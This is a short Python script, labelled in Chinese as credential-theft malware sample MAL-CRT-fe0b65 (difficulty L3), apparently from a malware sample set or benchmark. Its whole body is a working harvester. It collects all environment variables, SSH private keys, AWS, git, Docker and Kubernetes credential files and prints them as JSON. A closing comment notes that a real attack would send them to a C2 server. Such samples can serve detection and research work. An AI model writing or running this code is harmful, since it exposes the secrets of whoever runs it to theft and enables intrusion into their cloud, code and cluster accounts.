#!/usr/bin/env python3
# MAL-CRT-fe0b65 - 凭证窃取
# 难度：L3 | 语言：Python

import os
import json
import subprocess

def steal_credentials():
    credentials = {}
    
    # 1. 环境变量
    credentials['env'] = dict(os.environ)
    
    # 2. SSH 密钥
    ssh_dir = os.path.expanduser("~/.ssh")
    if os.path.exists(ssh_dir):
        credentials['ssh_keys'] = []
        for key_file in ['id_rsa', 'id_ed25519', 'id_ecdsa']:
            key_path = os.path.join(ssh_dir, key_file)
            if os.path.exists(key_path):
                with open(key_path, 'r') as f:
                    credentials['ssh_keys'].append(f.read())
    
    # 3. AWS 凭证
    aws_config = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(aws_config):
        with open(aws_config, 'r') as f:
            credentials['aws'] = f.read()
    
    # 4. Git 凭证
    git_config = os.path.expanduser("~/.git-credentials")
    if os.path.exists(git_config):
        with open(git_config, 'r') as f:
            credentials['git'] = f.read()
    
    # 5. Docker 凭证
    docker_config = os.path.expanduser("~/.docker/config.json")
    if os.path.exists(docker_config):
        with open(docker_config, 'r') as f:
            credentials['docker'] = f.read()
    
    # 6. Kubeconfig
    kube_config = os.path.expanduser("~/.kube/config")
    if os.path.exists(kube_config):
        with open(kube_config, 'r') as f:
            credentials['kubernetes'] = f.read()
    
    return credentials

if __name__ == '__main__':
    creds = steal_credentials()
    print(json.dumps(creds, indent=2, default=str))
    # 实际攻击中会外传到 C2 服务器
